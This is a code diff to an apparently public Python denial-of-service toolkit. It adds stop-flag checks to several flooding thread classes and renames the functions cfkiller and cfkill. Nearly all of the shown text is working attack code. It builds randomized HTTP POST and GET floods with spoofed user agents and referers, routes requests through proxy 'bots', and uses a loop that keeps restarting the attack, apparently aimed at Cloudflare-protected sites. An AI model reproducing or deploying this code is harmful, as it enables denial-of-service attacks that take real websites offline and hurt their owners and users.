@@ -153,6 +153,8 @@ class tcflood(threading.Thread):
       m+=str(random.randint(1,1000000))+random.choice(lis)
      m=m*amp
      try:
+      if stop==True:
+        break
       s.send(m.encode('utf-8'))
       counter+=1
       if prints==True:
@@ -287,6 +289,8 @@ class htflood(threading.Thread):
       par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
      try:
+      if stop==True:
+        break
       s.send(m.encode('utf-8'))
       counter+=1
       if prints==True:
@@ -451,6 +455,8 @@ class prflood(threading.Thread):
       par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
      try:
+      if stop==True:
+        break
       s.send(m.encode('utf-8'))
       counter+=1
       if prints==True:
@@ -1454,6 +1460,8 @@ class phu(threading.Thread):
     opener = urllib2.build_opener(proxy) 
     urllib2.install_opener(opener)
     urllib2.urlopen("http://"+target+u,timeout=timeout)
+    if stop==True:
+        break
     counter+=1
     if prints==True:
      print("[!]Requests: {} | Bot: {}".format(counter,pr.split(':')[0]))
@@ -1492,11 +1500,15 @@ class hu(threading.Thread):
      request.add_header('Connection', 'keep-alive')
      request.add_header('Host',target)
      try:
-      urllib2.urlopen(request,timeout=timeout)             
+      urllib2.urlopen(request,timeout=timeout)     
+      if stop==True:
+        break
       counter+=1
       if prints==True:
        print("Requests: {}".format(counter))
      except urllib2.HTTPError as ex:
+      if stop==True:
+        break
       counter+=1
       if prints==True:
        print("Requests: {}".format(counter))
@@ -2705,6 +2717,8 @@ class gldn(threading.Thread):
       params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
       conn.request("POST", pa, params, headers)
+    if stop==True:
+        break
     counter+=1
     if prints==True:
      print("[!]Requests: {} | Type: {}".format(counter,req))
@@ -2779,6 +2793,8 @@ class medu(threading.Thread):
          jo='?' 
          pa+=jo+q+"="+p
         conn.request("GET", 'http://'+target+pa)
+        if stop==True:
+         break
         counter+=1
         if prints==True:
          print("[!]Bot: {} | Method: GET | Count: {}".format(ip,counter))
@@ -2795,6 +2811,8 @@ class medu(threading.Thread):
            j+=random.choice(lis)
          params =k+'='+(j*random.randint(100,300))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
          conn.request("POST", 'http://'+target+random.choice(paths), params, headers)
+         if stop==True:
+          break
          counter+=1
          if prints==True:
           print("[!]Bot: {} | Method: POST | Count: {}".format(ip,counter))
@@ -2982,10 +3000,14 @@ class dose(threading.Thread):
        session.post(u, data={k:j}, headers=h,timeout=timeout)
       else:
        requests.post(u, data={k:j}, headers=h,timeout=timeout)
+    if stop==True:
+        break
     counter+=1
     if prints==True:
      print("[!]Requests: {} | Type: {}".format(counter,req))
    except requests.exceptions.ReadTimeout:
+    if stop==True:
+        break
     counter+=1
     if prints==True:
      print("[!]Requests: {} | Type: {}".format(counter,req))
@@ -3094,9 +3116,13 @@ class pdose(threading.Thread):
        j+=random.choice(lis)
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
       requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
+    if stop==True:
+        break
     counter+=1
     print("[!]Requests: {} | Type: {} | Bot: {}".format(counter,req,pr.split('://')[1].split(':')[0]))
    except requests.exceptions.ReadTimeout:
+    if stop==True:
+        break
     counter+=1
     print("[!]Requests: {} | Type: {} | Bot: {}".format(counter,req,pr.split('://')[1].split(':')[0]))
    except Exception as e:
@@ -3222,7 +3248,7 @@ def cki():
  while(ier!=10):
    time.sleep(.1)
  time.sleep(1)
-def cfkiller(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,returning=False):
+def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,returning=False):
  global prints
  global stop
  stop=False
@@ -3272,12 +3298,12 @@ def cfkiller(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True
    break
  if returning==True:
     return counter
-def cfkiller2(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait=10):
+def cfkiller(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait=10):
  c=time.time()
  global stop
  while True:
   try:
-   cfkiller(u,threads=threads,interval=(interval-int(time.time()-c)),maxtime=maxtime,cook=True,check=False)
+   cfkill(u,threads=threads,interval=(interval-int(time.time()-c)),maxtime=maxtime,cook=True,check=False)
    time.sleep(3)
    if logs==True:
     print("[*]Resarting the attack after {} seconds...".format(wait))
